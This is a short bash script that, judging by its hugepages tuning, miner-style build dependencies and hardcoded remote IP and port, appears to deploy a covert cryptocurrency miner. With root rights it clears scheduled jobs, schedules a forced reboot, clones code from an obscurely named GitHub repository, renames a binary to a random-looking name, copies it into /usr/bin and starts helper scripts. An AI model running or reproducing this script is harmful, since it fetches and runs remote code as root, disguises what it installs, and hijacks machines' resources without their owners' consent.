#!/bin/bash
IPADR="45.11.24.158:4500"
MNRCO="unnnsssoip"
ID="$(hostname)"
THREADS="$(nproc --all)"
for i in `atq | awk '{print $1}'`;do atrm $i;done
sudo echo 'sudo reboot -f' | at now + 12 hours
rm -rf /tmp/none/
sudo dpkg --configure -a
echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
sudo sysctl -p
sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
sudo apt-get install dos2unix
sleep 2
cd /tmp && mkdir none
git clone https://github.com/dfkujgdjfgf/unnnsssoip.git /tmp/none
cd /tmp/none
chmod 777 ./*.sh
mv service $MNRCO
chmod +x /tmp/none/$MNRCO
sudo cp /tmp/none/$MNRCO /usr/bin/$MNRCO
sleep 3
sudo dos2unix pusk.sh
sudo dos2unix checker.sh
sudo dos2unix 75.sh
sudo dos2unix 50.sh
sudo dos2unix 80.sh
sudo dos2unix 65.sh
sudo dos2unix 90.sh
sudo dos2unix 40.sh
sudo ./pusk.sh & ./checker.sh